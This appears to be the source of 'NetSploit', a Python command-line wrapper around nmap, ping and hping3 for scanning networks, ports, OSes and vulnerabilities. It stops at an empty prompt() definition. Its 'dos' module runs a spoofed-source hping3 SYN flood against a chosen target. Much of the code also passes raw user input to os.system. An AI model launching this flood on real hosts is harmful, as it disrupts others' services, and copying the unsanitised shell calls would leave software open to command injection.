""" IMPORTS """
import os
from simple_colors import yellow, blue, green, red, cyan
import sys
from tabulate import tabulate
import pickledb
# import ipaddress
import time
import datetime

""" PICKLEDB SETUP """
db = pickledb.load('netsploit.db', False)

""" CONFIG """
# NOTE: Change the paths to to absolute paths if needed

# username = os.popen('whoami').read()
# username = username.replace("\n", "")

# oui_file_path = f'/home/{username}/path/to/netsploit-py/oui.txt'  # noqa
oui_file_path = 'oui.txt'

# logs_folder_path = f'/home/{username}/path/to/netsploit-py/logs/'  # noqa
logs_folder_path = 'logs/'

""" STARTUP """
# Print ASCII art of "NetSploit"
header = """
     __     _   __       _       _ _
  /\ \ \___| |_/ _\_ __ | | ___ (_) |_
 /  \/ / _ \ __\ \| '_ \| |/ _ \| | __|
/ /\  /  __/ |__\ \ |_) | | (_) | | |_
\_\ \/ \___|\__\__/ .__/|_|\___/|_|\__|
                  |_|
"""  # noqa
print(blue(header, 'bold'))

# Print init messages
print(yellow(' => netsploit v1.0', 'bold'))
print(yellow(' => Powered by nmap, ping and hping3', 'bold'))
print(green(' => 9 modules ready to use', 'bold'))
# print(blue(' => network-scanner - device-info - os-guesser - oui-lookup - \n      port-scanner - dos - ping - vuln-scanner - custom', 'bold'))  # noqa
print(blue(' => 5 Scanners, 3 Info, 1 Attack', 'bold'))  # noqa
# print(cyan(' => Happy Hacking! :)', 'bold'))

# Set variables for printing network configuration

gateway = os.popen("ip route show | grep -i 'default via'| awk '{print $3 }'").read()  # noqa
gateway = gateway.replace("\n", "")

up_interface = os.popen("route | awk '/Iface/{getline; print $8}'").read()
up_interface = up_interface.replace("\n", "")

# Get wireless network name (was used previously)
# n_name = os.popen('iwgetid -r').read()

# Work-around to get wireless network name on Fedora Linux:
n_name = os.popen('nmcli -t -f NAME connection show --active').read()  

# Get network MAC address
n_mac = os.popen(
    "ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read()  # noqa
n_ip = os.popen("hostname -I").read()  # Local IP address
n_host = os.popen("hostname").read()  # hostname
# Print network configuration header

print(""" \033[1;36m
╒═════════════════════════════════════════════════════════════════════════╕
│                         Your Network Configuration                      │
╘═════════════════════════════════════════════════════════════════════════╛     \033[1;m""")  # noqa

# Print network configuration , using tabulate as table.

table = [["IP Address", "MAC Address", "Gateway", "Iface", "Hostname"],
         ["", "", "", "", ""],
         [n_ip, n_mac.upper(), gateway, up_interface, n_host]]
print(tabulate(table, stralign="center",
               tablefmt="fancy_grid", headers="firstrow"))
print()
print(f'{green("[+] Please type help to view commands", "bold")}')
# print()
# print(f'{cyan("[TIP]", "bold")} You can use the {yellow("auto", "bold")} command to automate your process!')  # noqa
print()


""" FONT STYLES """


# Error message font style
def error_message(error_msg, solution=None):
    if solution:
        print(f'[{red("!", "bold")}] {error_msg} {green(solution, "bold")}')  # noqa
    else:
        print(f'[{red("!", "bold")}] {error_msg}')


# Success message font style
def success_message(success_msg):
    print(f'[{green("+", "bold")}] {success_msg}')


# Info message font style
def info_message(info_msg):
    print(f'[{yellow("*", "bold")}] {info_msg}')


""" EXIT FUNCTION """


# Message to be printed when using exit command or Ctrl-C inputted
def exit():
    sys.exit(success_message('Shutting down NetSploit ... Bye! ( ^_^)/'))


""" FUNCTIONS """


# Network scanner function
def network_scanner():
    prompt_input = input(
            f'{yellow("netsploit", "underlined")} => {blue("(network-scanner)", "bold")} {green(">")} ')  # noqa
    # if prompt_input == 'show options':
    #     # if there is no set value for IP_RANGE, display as "(not set)"
    #     # or if there is an existing value, set the variable to the value
    # value = '(not set)' if db.get(
    #         'IP_RANGE') is False else db.get('IP_RANGE')
    # # Table for displaying options and other info
    # table = [['OPTIONS', 'VALUE', 'OPTIONAL?'], ['IP_RANGE', value, 'no']]  # noqa
    # # Print the table (on to the console, of course)
    # print(tabulate(table, headers='firstrow', tablefmt='fancy_grid'))
    # network_scanner()

    # elif prompt_input == 'subnet':
    #     # net = ipaddress.ip_network('192.168.0.0/255.255.255.0', strict=False) or ipaddress.ip_network('10.0.0.0/255.255.255.0', strict=False)  # noqa
    #     # print(net)
    #     net = str(os.popen("ip route show | grep -i 'default via'| awk '{print $3 }'").read())  # noqa
    #     net = net.replace("\n", "")
    #     net2 = net[:-1]
    #     net3 = net2 + "0"
    #     info_message(f'Subnet is "{net3}/24"')
    #     network_scanner()

    # elif prompt_input.startswith('IP_RANGE =>'):
    #     # split prompt_input from string to array
    #     optionArgs = prompt_input.split()
    #     # option is the second index (3rd string) in array
    #     option = optionArgs[2]
    #     # Set IP range to given option
    #     db.set('IP_RANGE', option)
    #     # Display success message like this: "IP_RANGE set to 192.168.0.1"
    #     info_message(f'IP_RANGE set to {db.get("IP_RANGE")}')
    #     network_scanner()

    if prompt_input == 'run':
        net = str(os.popen("ip route show | grep -i 'default via'| awk '{print $3 }'").read())  # noqa // Get LAN ip address. eg:  192.168.0.2\n
        net = net.replace("\n", "")  # Remove newline from `net`. eg: 192.168.0.2  # noqa
        net2 = net[:-1]  # Remove last character from `net`. eg: 192.168.0.
        net3 = net2 + "0"  # Add zero (0) to the end of the `net2`. eg: 192.168.0.  # noqa
        net4 = net3 + "/24"  # Add /24 to the end of `net3`. eg: 192.168.0.0/24
        IP_RANGE = net4
        # if IP_RANGE is False:  # If IP_RANGE is False, AKA, not set:
        #     error_message('Cannot start scan without IP_RANGE. Set the IP_RANGE using:', 'IP_RANGE => Your-IP-range-here')  # noqa
        #     network_scanner()  # Show the network scanner prompt
        info_message(f'Running network scan with IP range {IP_RANGE}, this may take up to two minutes')  # noqa
        info_message('Running a network scan properly requires the command to be run using sudo')  # noqa
        print()
        # For logging
        date = datetime.datetime.now()
        formatted_time = date.strftime('%I-%M-%S_%p_%d-%b-%Y')
        filename = f'network-scanner_log_{formatted_time}.txt'
        # Finally, run the scan
        os.system(f'sudo nmap -sn -T4 {IP_RANGE} -oN "{logs_folder_path}network-scanner/{filename}"')  # noqa
        # os.system(f'sudo nmap -sn -T4 {IP_RANGE}')
        print()
        success_message('Finished scanning network')
        print()
        # Ask the user if they want to save the scan results to a log file.
        # print()
        choice = input(f'[{green(">", "bold")}] {cyan("Do you want to save the results to a log file? (y/n): ", "bold")}')  # noqa
        if choice == 'y':  # If the users agrees, i.e. types "y":
            # pwd = os.popen('pwd').read()  # For printing to success message
            print()
            # Print a success message stating the log has been saved.
            success_message(f'Saved results to log file: {logs_folder_path}network-scanner/{filename}')  # noqa
            print()
        elif choice == 'n':  # Else if the user disagrees, i.e. types "n":
            os.system(f'rm "{logs_folder_path}network-scanner/{filename}" -f')  # Delete the log file  # noqa
            print()
            success_message('Did not save log file.')
            print()
        else:
            # If the user types anything other than "y" or "n":
            print()
            error_message('Invalid option. Enter either y - YES or n - NO')
            print()
            os.system(f'rm "{logs_folder_path}network-scanner/{filename}" -f')  # Delete the log file  # noqa
            network_scanner()
        network_scanner()

    elif prompt_input == 'back':
        prompt()

    elif prompt_input == 'exit':
        exit()

    elif prompt_input == '':
        network_scanner()

    elif prompt_input == 'clear':
        # Clear the terminal using `clear` shell command
        os.system('clear')
        network_scanner()

    elif prompt_input == 'help':
        # Help message
        print()
        print(f'{cyan("Help for network-scanner:", ["bold", "underlined"])}')
        print()
        print(f'To run a network scan, use {yellow("run", "bold")} command.')
        print()
        network_scanner()

    else:
        # If the user types a command that is not any of the above.

        # The invalid command is index 0 of array `prompt_input`
        invalidCommand = prompt_input.split()[0]
        error_message(f'Invalid command "{invalidCommand}". Please enter a valid command')  # noqa
        network_scanner()


# Device Info function
def device_info():
    prompt_input = input(
            f'{yellow("netsploit", "underlined")} => {blue("(device-info)", "bold")} {green(">")} ')  # noqa
    prompt_input = prompt_input.lower()

    if prompt_input == 'show options':
        # If the value is not set (default is False), set `value` to "(not set)".  # noqa
        # If the value is set, then `value` is set to value from user input
        value = '(not set)' if db.get(
                'TARGET') is False else db.get('TARGET')
        # Table for displaying options and other info
        table = [['OPTIONS', 'VALUE', 'OPTIONAL?'], ['TARGET', value, 'no']]  # noqa
        # Print the table (on to the console, of course)
        print(tabulate(table, headers='firstrow', tablefmt='fancy_grid'))
        device_info()

    elif prompt_input.startswith('target =>') or prompt_input.startswith('set target'):  # noqa
        # split prompt_input from string to array
        optionArgs = prompt_input.split()
        # option is the second index (3rd string) in array
        option = optionArgs[2]
        # Set IP range to given option
        db.set('TARGET', option)
        # Display success message like this: "IP_RANGE set to 192.168.0.1"
        success_message(f'TARGET set to "{db.get("TARGET")}"')
        device_info()

    elif prompt_input == 'run':
        # If the command is "run":

        # retrive TARGET value from database
        TARGET = db.get('TARGET')
        # If the value of `TARGET` is not set by the user:
        if TARGET is False:
            # Print an error message
            error_message(
                'Cannot run scan(s) without TARGET being specified. Please specify the TARGET and try again')  # noqa
            device_info()
        else:
            # Or, if the value of `TARGET` is set:

            info_message(f'Running device scan on {TARGET}, this may take up to two minutes')  # noqa
            info_message('Running a device scan properly requires the command to be run using sudo')  # noqa
            print()
            # For logging
            date = datetime.datetime.now()
            formatted_time = date.strftime('%I-%M-%S_%p_%d-%b-%Y')
            filename = f'device-info_log_{formatted_time}.txt'
            # Run the scan
            os.system(f'sudo nmap -v -A -T4 {TARGET} -Pn -oN "{logs_folder_path}/device-info/{filename}" -f')  # noqa
            # os.system(f'sudo nmap -v -A -T4 {TARGET} -Pn')
            print()
            # Print a success message
            success_message(f'Finished scanning {TARGET}')
            device_info()
            # Ask the user if they want to save the scan results to a log file.
            # print()
            choice = input(f'[{green(">", "bold")}] {cyan("Do you want to save the results to a log file? (y/n): ", "bold")}')  # noqa
            if choice == 'y':  # If the users agrees, i.e. types "y":
                # pwd = os.popen('pwd').read()  # For printing to success message  # noqa
                print()
                # Print a success message stating the log has been saved.
                success_message(f'Saved results to log file: {logs_folder_path}/device-info/{filename}')  # noqa
                print()
            elif choice == 'n':  # Else if the user disagrees, i.e. types "n":
                os.system(f'rm "{logs_folder_path}device-info/{filename}" -f')  # Delete the log file  # noqa
                print()
                success_message('Did not save log file.')
                print()
            else:
                # If the user types anything other than "y" or "n":
                print()
                error_message('Invalid option. Enter either y - YES or n - NO')
                print()
                os.system(f'rm "{logs_folder_path}network-scanner/{filename}" -f')  # Delete the log file  # noqa
                device_info()
        device_info()

    elif prompt_input == 'exit':
        # Exit the program
        exit()

    elif prompt_input == 'back':
        # Go back to initial prompt
        prompt()

    elif prompt_input == '':
        # If user didn't enter anything and pressed enter, show os_guesser prompt again.  # noqa
        device_info()

    elif prompt_input == 'help':
        # Help message
        print()
        print(f'{cyan("Help for device-info:", ["bold", "underlined"])}')
        print()
        print(f'[{yellow("Optional", "italic")}] See options that you can set using {yellow("show options", "bold")}')  # noqa
        print(f'1. Set the target using {yellow("set TARGET 123.456.789", "bold")} or {yellow("TARGET => 123.456.789", "bold")} (make sure to replace 123.456.789 with the IP of your target!)')  # noqa
        print(f'2. Run your scan using {yellow("run", "bold")}')
        print()
        device_info()

    elif prompt_input == 'clear':
        # Clear the terminal using the shell command `clear`
        os.system('clear')
        device_info()

    else:

        # If the user types a command that is not any of the above.

        # The invalid command is index 0 of array `prompt_input`
        invalidCommand = prompt_input.split()[0]
        error_message(f'Invalid command "{invalidCommand}". Please enter a valid command')  # noqa
        device_info()


def os_guesser():
    prompt_input = input(f'{yellow("netsploit", "underlined")} => {blue("(os-guesser)", "bold")} {green(">")} ')  # noqa
    prompt_input = prompt_input.lower()

    if prompt_input == 'show options':
        value = '(not set)' if db.get(
                'TARGET') is False else db.get('TARGET')
        # Table for displaying options and other info
        table = [['OPTIONS', 'VALUE', 'OPTIONAL?'], ['TARGET', value, 'no']]  # noqa
        # Print the table
        print(tabulate(table, headers='firstrow', tablefmt='fancy_grid'))
        os_guesser()

    elif prompt_input.startswith('target =>') or prompt_input.startswith('set target'):  # noqa
        # split prompt_input from string to array
        optionArgs = prompt_input.split()
        # option is the second index (3rd string) in array
        option = optionArgs[2]
        # Set IP range to given option
        db.set('TARGET', option)
        # Display success message like this: "IP_RANGE set to 192.168.0.1"
        success_message(f'TARGET set to "{db.get("TARGET")}"')
        os_guesser()

    elif prompt_input == 'run':
        # If the command is "run":

        # retrive TARGET value from database
        TARGET = db.get('TARGET')
        # If the value of `TARGET` is not set by the user:
        if TARGET is False:
            # Print an error message
            error_message(
                'Cannot run scan(s) without TARGET being specified. Please specify the TARGET and try again')  # noqa
            os_guesser()
        else:
            # Or, if the value of `TARGET` is set:

            info_message(f'Running OS Guesser scan on {TARGET}, this may take up to two minutes')  # noqa
            info_message('Running a OS Guesser scan properly requires the command to be run using sudo')  # noqa
            print()
            # For logging
            date = datetime.datetime.now()
            formatted_time = date.strftime('%I-%M-%S_%p_%d-%b-%Y')
            filename = f'os-guesser_log_{formatted_time}.txt'
            # Run the scan
            os.system(f'sudo nmap -O --osscan-guess {TARGET} -Pn  -oN "{logs_folder_path}/os-guesser/{filename}"')  # noqa
            # os.system(f'sudo nmap -O --osscan-guess {TARGET} -Pn')
            print()
            # Print a success message
            success_message(f'Finished scanning {TARGET}')
            print()
            # Ask the user if they want to save the scan results to a log file.
            # print()
            choice = input(f'[{green(">", "bold")}] {cyan("Do you want to save the results to a log file? (y/n): ", "bold")}')  # noqa
            if choice == 'y':  # If the users agrees, i.e. types "y":
                # pwd = os.popen('pwd').read()  # For printing to success message  # noqa
                print()
                # Print a success message stating the log has been saved.
                success_message(f'Saved results to log file: "{logs_folder_path}os-guesser/{filename}"')  # noqa
                print()
            elif choice == 'n':  # Else if the user disagrees, i.e. types "n":
                os.system(f'rm "{logs_folder_path}os-guesser/{filename}" -f')  # Delete the log file  # noqa
                print()
                success_message('Did not save log file.')
                print()
            else:
                # If the user types anything other than "y" or "n":
                print()
                error_message('Invalid option. Enter either y - YES or n - NO')
                print()
                os.system(f'rm "{logs_folder_path}network-scanner/{filename}" -f')  # Delete the log file  # noqa
                os_guesser()
            os_guesser()
        os_guesser()

    elif prompt_input == 'exit':
        # Exit the program
        exit()

    elif prompt_input == 'back':
        # Go back to initial prompt
        prompt()

    elif prompt_input == '':
        # If user didn't enter anything and pressed enter, show os_guesser prompt again.  # noqa
        os_guesser()

    elif prompt_input == 'clear':
        # Clear the terminal using the shell command `clear`
        os.system('clear')
        os_guesser()

    elif prompt_input == 'help':
        # Help message
        print()
        print(f'{cyan("Help for os-guesser:", ["bold", "underlined"])}')
        print()
        print(f'[{yellow("Optional", "italic")}] See options that you can set using {yellow("show options", "bold")}')  # noqa
        print(f'1. Set the target using {yellow("set TARGET 123.456.789", "bold")} or {yellow("TARGET => 123.456.789", "bold")} (make sure to replace 123.456.789 with the IP of your target!)')  # noqa
        print(f'2. Run your scan using {yellow("run", "bold")}')
        print()
        os_guesser()

    else:

        # If the user types a command that is not any of the above.

        # The invalid command is index 0 of array
        invalidCommand = prompt_input.split()[0]
        error_message(f'Invalid command "{invalidCommand}". Please enter a valid command')  # noqa
        os_guesser()


def oui_lookup():
    print(f'{yellow("netsploit", "underlined")} => {blue("(oui-lookup)", "bold")}\n')  # noqa
    oui = input(f'[{green(">", "bold")}] {cyan("Enter OUI to lookup: ", "bold")}')  # noqa
    # For logging
    date = datetime.datetime.now()
    formatted_time = date.strftime('%I-%M-%S_%p_%d-%b-%Y')
    filename = f'oui-lookup_log_{formatted_time}.txt'
    os.system(f'touch "{logs_folder_path}oui-lookup/{filename}"')
    with open(oui_file_path) as f:
        if oui in f.read():
            print()
            success_message(f'Found OUI {cyan(oui, "bold")} in database.')
            file = open(oui_file_path, "r")
            searchlines = file.readlines()
            file.close()
            for i, line in enumerate(searchlines):
                if oui in line:
                    for foundLine in searchlines[i:i+3]:
                        print()
                        print(f'\t{yellow(foundLine, "bold")}')
                        print()
            choice = input(f'[{green(">", "bold")}] {cyan("Do you want to save the results to a log file? (y/n): ", "bold")}')  # noqa
            if choice == 'y':  # If the users agrees, i.e. types "y":
                # pwd = os.popen('pwd').read()  # For printing to success message  # noqa
                print()
                # Print a success message stating the log has been saved.
                for i, line in enumerate(searchlines):
                    if oui in line:
                        for foundLine in searchlines[i:i+3]:
                            os.system(f'echo "{foundLine}" >> "{logs_folder_path}oui-lookup/{filename}"')  # noqa

                success_message(f'Saved results to log file: {logs_folder_path}oui-lookup/{filename}')  # noqa
                print()
            elif choice == 'n':  # Else if the user disagrees, i.e. types "n":
                os.system(f'rm "{logs_folder_path}oui-lookup/{filename}" -f')  # Delete the log file  # noqa
                print()
                success_message('Did not save log file.')
                print()
            else:
                # If the user types anything other than "y" or "n":
                print()
                error_message('Invalid option. Enter either y - YES or n - NO')
                print()
                os.system(f'rm "{logs_folder_path}oui-lookup/{filename}" -f')  # Delete the log file  # noqa
                ()

        else:
            print()
            error_message(f'Could not find OUI {cyan(oui, "bold")} in database.')  # noqa
            print()

    prompt()


def port_scanner():
    prompt_input = input(
            f'{yellow("netsploit", "underlined")} => {blue("(port-scanner)", "bold")} {green(">")} ')  # noqa
    prompt_input = prompt_input.lower()

    if prompt_input == 'show options':
        value = '(not set)' if db.get(
                'TARGET') is False else db.get('TARGET')
        # Table for displaying options and other info
        table = [['OPTIONS', 'VALUE', 'OPTIONAL?'], ['TARGET', value, 'no']]  # noqa
        # Print the table (on to the console, of course)
        print(tabulate(table, headers='firstrow', tablefmt='fancy_grid'))
        port_scanner()

    elif prompt_input.startswith('target =>') or prompt_input.startswith('set target'):  # noqa
        # split prompt_input from string to array
        optionArgs = prompt_input.split()
        # option is the second index (3rd string) in array
        option = optionArgs[2]
        # Set IP range to given option
        db.set('TARGET', option)
        # Display success message like this: "IP_RANGE set to 192.168.0.1"
        success_message(f'TARGET set to "{db.get("TARGET")}"')
        port_scanner()

    elif prompt_input == 'run':
        TARGET = db.get('TARGET')
        if TARGET is False:
            error_message(
                'Cannot run scan(s) without TARGET being specified. Please specify the TARGET and try again')  # noqa
            port_scanner()
        else:
            info_message(f'Running port scan on {TARGET}, this may take up to two minutes')  # noqa
            print()
            date = datetime.datetime.now()
            formatted_time = date.strftime('%I-%M-%S_%p_%d-%b-%Y')
            filename = f'port-scanner_log_{formatted_time}.txt'
            os.system(
            f'nmap -T4 {TARGET} -sV -Pn -oN "{logs_folder_path}port-scanner/{filename}"')  # noqa
            # os.system(f'nmap -T4 {TARGET} -sV -Pn')
            print()
            success_message(f'Finished scanning {TARGET}')
            print()
            choice = input(f'[{green(">", "bold")}] {cyan("Do you want to save the results to a log file? (y/n): ", "bold")}')  # noqa
            if choice == 'y':
                # pwd = os.popen('pwd').read()
                print()
                success_message(f'Saved results to log file: {logs_folder_path}port-scanner/{filename}')  # noqa
                print()
            elif choice == 'n':
                os.system(f'rm "{logs_folder_path}port-scanner/{filename}" -f')
                print()
                success_message('Did not save log file.')
                print()
            else:
                error_message('Invalid option. Enter either y - YES or n - NO')  # noqa
            port_scanner()
        port_scanner()

    elif prompt_input == 'exit':
        exit()

    elif prompt_input == 'back':
        prompt()

    elif prompt_input == '':
        port_scanner()

    elif prompt_input == 'clear':
        os.system('clear')
        port_scanner()

    elif prompt_input == 'help':
        print()
        print(f'{cyan("Help for port-scanner:", ["bold", "underlined"])}')
        print()
        print(f'[{yellow("Optional", "italic")}] See options that you can set using {yellow("show options", "bold")}')  # noqa
        print(f'1. Set the target using {yellow("set TARGET 123.456.789", "bold")} or {yellow("TARGET => 123.456.789", "bold")} (make sure to replace 123.456.789 with the IP of your target!)')  # noqa
        print(f'2. Run your scan using {yellow("run", "bold")}')
        print()
        port_scanner()

    else:
        invalidCommand = prompt_input.split()[0]
        error_message(f'Invalid command "{invalidCommand}". Please enter a valid command')  # noqa
        port_scanner()


def dos():
    prompt_input = input(
            f'{yellow("netsploit", "underlined")} => {blue("(dos)", "bold")} {green(">")} ')  # noqa
    prompt_input = prompt_input.lower()

    if prompt_input == 'show options':
        value = '(not set)' if db.get(
                'TARGET') is False else db.get('TARGET')
        # Table for displaying options and other info
        table = [['OPTIONS', 'VALUE', 'OPTIONAL?'], ['TARGET', value, 'no']]  # noqa
        # Print the table (on to the console, of course)
        print(tabulate(table, headers='firstrow', tablefmt='fancy_grid'))
        dos()

    elif prompt_input.startswith('target =>') or prompt_input.startswith('set target'):  # noqa
        # split prompt_input from string to array
        optionArgs = prompt_input.split()
        # option is the second index (3rd string) in array
        option = optionArgs[2]
        # Set IP range to given option
        db.set('TARGET', option)
        # Display success message like this: "IP_RANGE set to 192.168.0.1"
        success_message(f'TARGET set to "{db.get("TARGET")}"')
        dos()

    elif prompt_input == 'run':
        TARGET = db.get('TARGET')
        if TARGET is False:
            error_message(
                'Cannot run DoS attack without TARGET being specified. Please specify the TARGET and try again')  # noqa
            dos()
        else:
            info_message(f'Running DoS attack on {TARGET}, this may take up to two minutes')  # noqa
            info_message('Running a DoS attack properly requires the command to be run using sudo')  # noqa
            print()
            os.system(f'sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source {TARGET}')  # noqa
            print()
            success_message(f'Finished attacking {TARGET}')
            dos()
        dos()

    elif prompt_input == 'exit':
        exit()

    elif prompt_input == 'back':
        prompt()

    elif prompt_input == '':
        dos()

    elif prompt_input == 'help':
        print()
        print(f'{cyan("Help for dos:", ["bold", "underlined"])}')
        print()
        print(f'[{yellow("Optional", "italic")}] See options that you can set using {yellow("show options", "bold")}')  # noqa
        print(f'1. Set the target using {yellow("set TARGET 123.456.789", "bold")} or {yellow("TARGET => 123.456.789", "bold")} (make sure to replace 123.456.789 with the IP of your target!)')  # noqa
        print(f'2. Run your scan using {yellow("run", "bold")}')
        print()
        dos()

    elif prompt_input == 'clear':
        os.system('clear')
        dos()

    else:
        invalidCommand = prompt_input.split()[0]
        error_message(f'Invalid command "{invalidCommand}". Please enter a valid command')  # noqa
        dos()


def ping():
    print(f'{yellow("netsploit", "underlined")} => {blue("(ping)", "bold")}\n')  # noqa
    # print(f'{yellow("Ping modes:", ["bold", "underlined"])}\n1. {cyan("ping", "bold")}\n2. {cyan("nping", "bold")}\n')  # noqa
    # pingmode = input(f'[{green(">", "bold")}] {cyan("Enter ping mode to use: ", "bold")}')  # noqa
    # if pingmode == 'ping' or '1':

    alreadySetTarget = db.get('TARGET')
    if alreadySetTarget is False:
        target = input(f'[{green(">", "bold")}] {cyan("IP of device to ping:")} ')  # noqa
        print()
        info_message(f'Pinging {target} (5 times)...\n')
        os.system(f'ping -c 5 {target}')
        print()
        success_message(f'Finished pinging {target}\n')
        prompt()
        # elif pingmode == 'nping' or '2':
        #     target = input('Enter IP of device to ping: ')
        #     print()
        #     info_message(f'Pinging {target} (5 times)...')
        #     os.system(f'nping -c 5 {target}')
        #     print()
        #     success_message(f'Finished pinging {target}\n')
        #     prompt()
        # else:
        #     print()
        #     error_message(f'Invalid option: "{pingmode}", please enter either "ping" or "nping" as per your needs.\n')  # noqa
        #     ping()
    else:

        userchoice = input((f'[{green(">", "bold")}] {cyan(f"Target has already been set. Do you want to ping {alreadySetTarget}? [y/n]: ")}'))  # noqa
        if userchoice == 'y':
            # target = input(f'[{green(">", "bold")}] {cyan("IP of device to ping:")} ')  # noqa
            print()
            info_message(f'Pinging {alreadySetTarget} (5 times)...\n')
            os.system(f'ping -c 5 {alreadySetTarget}')
            print()
            success_message(f'Finished pinging {alreadySetTarget}\n')
            prompt()
            # elif pingmode == 'nping' or '2':
            #     target = input('Enter IP of device to ping: ')
            #     print()
            #     info_message(f'Pinging {target} (5 times)...')
            #     os.system(f'nping -c 5 {target}')
            #     print()
            #     success_message(f'Finished pinging {target}\n')
            #     prompt()
            # else:
            #     print()
            #     error_message(f'Invalid option: "{pingmode}", please enter either "ping" or "nping" as per your needs.\n')  # noqa
            #     ping()

        elif userchoice == 'n':
            print()
            success_message(f'Okay, not using {alreadySetTarget} as target.')
            print()
            target = input(f'[{green(">", "bold")}] {cyan("IP of device to ping:")} ')  # noqa
            print()
            info_message(f'Pinging {target} (5 times)...\n')
            os.system(f'ping -c 5 {target}')
            print()
            success_message(f'Finished pinging {target}\n')
            prompt()
            # elif pingmode == 'nping' or '2':
            #     target = input('Enter IP of device to ping: ')
            #     print()
            #     info_message(f'Pinging {target} (5 times)...')
            #     os.system(f'nping -c 5 {target}')
            #     print()
            #     success_message(f'Finished pinging {target}\n')
            #     prompt()
            # else:
            #     print()
            #     error_message(f'Invalid option: "{pingmode}", please enter either "ping" or "nping" as per your needs.\n')  # noqa
            #     ping()


def vuln_scanner():
    prompt_input = input(
            f'{yellow("netsploit", "underlined")} => {blue("(vuln-scanner)", "bold")} {green(">")} ')  # noqa
    prompt_input = prompt_input.lower()

    if prompt_input == 'show options':
        value = '(not set)' if db.get(
                'TARGET') is False else db.get('TARGET')
        # Table for displaying options and other info
        table = [['OPTIONS', 'VALUE', 'OPTIONAL?'], ['TARGET', value, 'no']]  # noqa
        # Print the table (on to the console, of course)
        print(tabulate(table, headers='firstrow', tablefmt='fancy_grid'))
        vuln_scanner()

    elif prompt_input.startswith('target =>') or prompt_input.startswith('set target'):  # noqa
        # split prompt_input from string to array
        optionArgs = prompt_input.split()
        # option is the second index (3rd string) in array
        option = optionArgs[2]
        # Set IP range to given option
        db.set('TARGET', option)
        # Display success message like this: "IP_RANGE set to 192.168.0.1"
        success_message(f'TARGET set to "{db.get("TARGET")}"')
        vuln_scanner()

    elif prompt_input == 'run':
        TARGET = db.get('TARGET')
        if TARGET is False:
            error_message(
                'Cannot run Vulnerability Scanner without TARGET being specified. Please specify the TARGET and try again')  # noqa
            vuln_scanner()
        else:
            info_message(f'Running Vulnerability scan on {TARGET}, this may take up to two minutes')  # noqa
            # For logging
            date = datetime.datetime.now()
            formatted_time = date.strftime('%I-%M-%S_%p_%d-%b-%Y')
            filename = f'vuln-scanner_log_{formatted_time}.txt'
            print()
            # os.system(f'nmap --script nmap-vulners/ -sV {TARGET}')
            os.system(f'nmap --script nmap-vulners/ -sV {TARGET} -oN "{logs_folder_path}vuln-scanner/{filename}" -Pn')  # noqa
            print()
            # Ask the user if they want to save the scan results to a log file.
            # print()
            choice = input(f'[{green(">", "bold")}] {cyan("Do you want to save the results to a log file? (y/n): ", "bold")}')  # noqa
            if choice == 'y':  # If the users agrees, i.e. types "y":
                # pwd = os.popen('pwd').read()  # For printing to success message  # noqa
                print()
                # Print a success message stating the log has been saved.
                success_message(f'Saved results to log file: {logs_folder_path}vuln-scanner/{filename}')  # noqa
                print()
            elif choice == 'n':  # Else if the user disagrees, i.e. types "n":
                os.system(f'rm "{logs_folder_path}vuln-scanner/{filename}" -f')  # Delete the log file  # noqa
                print()
                success_message('Did not save log file.')
                print()
            else:
                # If the user types anything other than "y" or "n":
                print()
                error_message('Invalid option. Enter either y - YES or n - NO')
                print()
                os.system(f'rm "{logs_folder_path}vuln-scanner/{filename}" -f')  # Delete the log file  # noqa
                vuln_scanner()
            success_message(f'Finished scanning {TARGET}')
            vuln_scanner()
        vuln_scanner()

    elif prompt_input == 'exit':
        exit()

    elif prompt_input == 'back':
        prompt()

    elif prompt_input == '':
        vuln_scanner()

    elif prompt_input == 'help':
        print()
        print(f'{cyan("Help for vuln-scanner:", ["bold", "underlined"])}')
        print()
        print(f'[{yellow("Optional", "italic")}] See options that you can set using {yellow("show options", "bold")}')  # noqa
        print(f'1. Set the target using {yellow("set TARGET 123.456.789", "bold")} or {yellow("TARGET => 123.456.789", "bold")} (make sure to replace 123.456.789 with the IP of your target!)')  # noqa
        print(f'2. Run your scan using {yellow("run", "bold")}')
        print()
        vuln_scanner()

    elif prompt_input == 'clear':
        os.system('clear')
        vuln_scanner()

    else:
        invalidCommand = prompt_input.split()[0]
        error_message(f'Invalid command "{invalidCommand}". Please enter a valid command')  # noqa
        vuln_scanner()


def custom():
    print(f'{yellow("netsploit", "underlined")} => {blue("(custom)", "bold")}\n')  # noqa
    custom_nmap_cmd = input(f'[{green(">", "bold")}] {cyan("Enter custom nmap command to run: ", "bold")}')  # noqa
    if custom_nmap_cmd.startswith('nmap'):
        print()
        success_message(f'Running custom nmap command "{custom_nmap_cmd}"')
        print()
        os.system(custom_nmap_cmd)
        print()
        prompt()

    elif custom_nmap_cmd.startswith('sudo'):
        str = custom_nmap_cmd.split()
        if str[1] == 'nmap':
            print()
            success_message(f'Running custom nmap command "{custom_nmap_cmd}"')
            print()
            os.system(custom_nmap_cmd)
            print()
            prompt()

    else:
        print()
        error_message(f'Your command must be an nmap command! To run any other shell command, use the {yellow("shell", "bold")} (netsploit) command.')  # noqa
        print()
        choice = input(f'[{green(">", "bold")}] {cyan("Did you mean to run a shell commmand? [y/n]: ", "bold")}')  # noqa
        if choice == 'y':
            print()
            shell()
        elif choice == 'n':
            print()
            prompt()
        else:
            error_message(f'Invalid option "{choice}"')
            prompt()


def shell():
    print(f'{yellow("netsploit", "underlined")} => {blue("(shell)", "bold")}\n')  # noqa
    custom_cmd = input(f'[{green(">", "bold")}] {cyan("Enter shell command to run: ", "bold")}')  # noqa
    print()
    success_message(f'Running shell command "{custom_cmd}"')
    print()
    # pwd = os.popen('pwd').read()
    # os.system('cd ~')
    os.system(f'cd ~ && {custom_cmd}')
    # os.system(f'cd "{pwd}"')
    print()
    prompt()

# def custom():
#     print(f'{yellow("netsploit", "underlined")} => {blue("(custom)", "bold")}\n')  # noqa
#     custom_nmap_cmd = input(f'[{green(">", "bold")}] {cyan("Enter custom nmap command to run: ", "bold")}')  # noqa
#     if custom_nmap_cmd.startswith('nmap'):
#         print()
#         success_message(f'Running custom nmap command "{custom_nmap_cmd}"')
#         print()
#         os.system(custom_nmap_cmd)
#         print()
#         prompt()
#
#     elif custom_nmap_cmd.startswith('sudo'):
#         str = custom_nmap_cmd.split()
#         if str[1] == 'nmap':
#             print()
#             success_message(f'Running custom nmap command "{custom_nmap_cmd}"')  # noqa
#             print()
#             os.system(custom_nmap_cmd)
#             print()
#             prompt()


""" PROMPT """


def prompt():
